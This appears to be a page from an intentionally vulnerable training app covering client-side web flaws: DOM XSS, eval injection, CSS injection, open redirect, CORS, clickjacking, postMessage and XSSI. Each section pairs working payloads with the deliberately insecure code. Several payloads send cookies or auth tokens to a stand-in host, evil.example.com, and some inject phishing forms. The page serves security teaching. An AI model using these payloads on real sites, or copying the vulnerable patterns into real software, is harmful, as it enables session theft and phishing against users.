4.11.1 – DOM-Based XSS

The value of the name parameter in the URL is inserted directly into the DOM via innerHTML.

Examples:

  • ?name=<img src=x onerror=alert('XSS')> — image tag with event handler
  • ?name=<svg onload=alert(document.domain)> — SVG onload
  • ?name=<details open ontoggle=alert(1)>click</details> — ontoggle event
  • ?name=<marquee onstart=alert(document.cookie)>XSS</marquee> — deprecated tag
  • ?name=<iframe srcdoc="<script>alert('XSS')</script>"> — iframe srcdoc
No input received.
Vulnerable code 
const params = new URLSearchParams(location.search);
const name = params.get('name');
if (name) {
  document.getElementById('domxss-output').innerHTML = 'Hello, ' + name;
}

4.11.2 – JavaScript Execution

User input is passed directly to eval().

Examples:

  • alert('JS Exec!') — simple popup
  • document.cookie — read cookies
  • document.location='https://evil.example.com?c='+document.cookie — cookie stealing
  • fetch('/api/user').then(r=>r.text()).then(alert) — data exfiltration via fetch
  • new Image().src='https://evil.example.com/log?d='+localStorage.getItem('auth_token') — token exfil
Vulnerable code 
function jsExec() {
  const code = document.getElementById('jsexec-input').value;
  const result = eval(code);                   // ← VULNERABLE
  document.getElementById('jsexec-output').textContent = 'Result: ' + result;
}

4.11.3 – HTML Injection

Input is inserted into the DOM using innerHTML without sanitization.

Examples:

  • <h1 style="color:red">INIETTATO</h1> — injected heading
  • <form action="https://evil.example.com"><input name=user placeholder="Username"><input type=password name=pw placeholder="Password"><button>Login</button></form> — phishing form
  • <a href="javascript:alert(1)">Clicca qui per il premio!</a> — malicious link
  • <table><tr><td>Nome</td><td>ADMIN</td></tr></table> — visual data override
Vulnerable code 
function htmlInject() {
  const html = document.getElementById('html-input').value;
  document.getElementById('html-output').innerHTML = html;  // ← VULNERABLE
}

4.11.4 – Client-side URL Redirect

The redirect parameter in the URL is used to redirect without validation.

Try: ?redirect=https://evil.example.com

Vulnerable code 
const redir = new URLSearchParams(location.search).get('redirect');
if (redir) { location.href = redir; }   // ← VULNERABLE: open redirect

4.11.5 – CSS Injection

The color parameter in the URL is inserted directly into a <style> tag.

Examples:

  • red;} body{background:red — rule escape + background override
  • green;} *{display:none — hide the entire page (defacement)
  • blue;} body::after{content:'HACKED';font-size:5em;color:red;position:fixed;top:40%;left:30% — defacement with pseudo-element
  • red;} input[value^="a"]{background:url('https://evil.example.com/?leak=a')} — CSS exfil (attribute selector)
This text will change color.
Vulnerable code 
function cssInject() {
  const color = document.getElementById('css-input').value;
  const style = document.createElement('style');
  style.textContent = '#css-target { color: ' + color + '; }'; // ← VULNERABLE
  document.head.appendChild(style);
}

4.11.6 – Client-side Resource Manipulation

The src attribute of an image and the href of a link are controlled by the URL.

Try: ?img=https://evil.example.com/fake.png

Link: Click here

Vulnerable code 
function resourceManip() {
  const url = document.getElementById('resource-input').value;
  document.getElementById('resource-img').src = url;          // ← VULNERABLE
  document.getElementById('resource-link').href = url;        // ← VULNERABLE
}

4.11.7 – Cross Origin Resource Sharing

The server responds with Access-Control-Allow-Origin: * and Allow-Credentials: true.

Click to read sensitive data from the API.

Vulnerable code 
// server.js
res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Access-Control-Allow-Credentials', 'true');

// An attacker on evil.com can do:
fetch('http://localhost:3000/api/user')
  .then(r => r.json())
  .then(data => {
    // Sensitive data now accessible cross-origin
  });

4.11.8 – Cross Site Flashing

Adobe Flash is deprecated (EOL December 2020). This vulnerability is now historical.

⚠️ Flash Player is no longer supported by modern browsers.

Historically, .swf files could be manipulated via FlashVars parameters or through the ExternalInterface interface to execute JavaScript in the host page context.

Historical example of a vulnerable URL:
http://example.com/player.swf?callback=javascript:alert('XSS')

4.11.9 – Clickjacking

This page does not send the X-Frame-Options or Content-Security-Policy: frame-ancestors headers, so it can be embedded in an <iframe> on a malicious site.

Simulation: the "Delete Account" button is hidden under "Win a prize!"

Vulnerable code 
// The server does NOT send these protective headers:
// X-Frame-Options: DENY
// Content-Security-Policy: frame-ancestors 'self'

// An attacker can embed the page in an iframe:
<iframe src="http://localhost:3000" style="opacity:0.01"></iframe>

4.11.10 – WebSockets

The WebSocket server accepts connections from any origin and echoes messages without sanitization.

Examples of malicious messages:

  • <img src=x onerror=alert('WS-XSS')> — XSS via WebSocket
  • <a href="javascript:alert(document.cookie)">Clicca</a> — JS link in the message
  • <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#fff;z-index:9999">HACKED</div> — overlay
Vulnerable code 
// Server: no Origin check
wss.on('connection', (ws) => {
  ws.on('message', (data) => {
    // Broadcast without sanitization
    wss.clients.forEach(c => c.send(data.toString()));
  });
});

// Client: direct insertion into the DOM
ws.onmessage = (e) => {
  outputDiv.innerHTML += e.data;  // ← VULNERABLE
};

4.11.11 – Web Messaging

The page accepts postMessage from any origin without verifying event.origin.

Examples (paste in the browser console):

  • window.postMessage('<b>Iniettato!</b>','*') — HTML injection via postMessage
  • window.postMessage('<img src=x onerror=alert(document.domain)>','*') — XSS via postMessage
  • window.postMessage('<form action=https://evil.example.com><input name=token><button>Invia</button></form>','*') — injected phishing form
Waiting for messages…
Vulnerable code 
window.addEventListener('message', function(event) {
  // ⚠️ No check on event.origin!
  document.getElementById('msg-output').innerHTML = event.data;
});

4.11.12 – Browser Storage

Sensitive data saved in localStorage and sessionStorage without encryption, accessible by any script in the same origin.

Vulnerable code 
// Saving sensitive data in plaintext in browser storage
localStorage.setItem('auth_token', 'eyJhbGciOiJIUzI1NiJ9.secret');
localStorage.setItem('user_password', 'P@ssw0rd123!');
sessionStorage.setItem('credit_card', '4111-1111-1111-1111');

// Any script (including one injected via XSS) can read:
const token = localStorage.getItem('auth_token');

4.11.13 – Cross Site Script Inclusion (XSSI)

The server exposes sensitive data as a global JavaScript file. An attacker can include it with <script src="…"> from their own site.

Vulnerable code 
// Server serves sensitive data as executable JS:
//   GET /api/data.js → var sensitiveData = { users: [...] };

// Attacker on evil.com:
<script src="http://localhost:3000/api/data.js"></script>
<script>
  // sensitiveData is now accessible!
  fetch('https://evil.com/steal?d=' + JSON.stringify(sensitiveData));
</script>
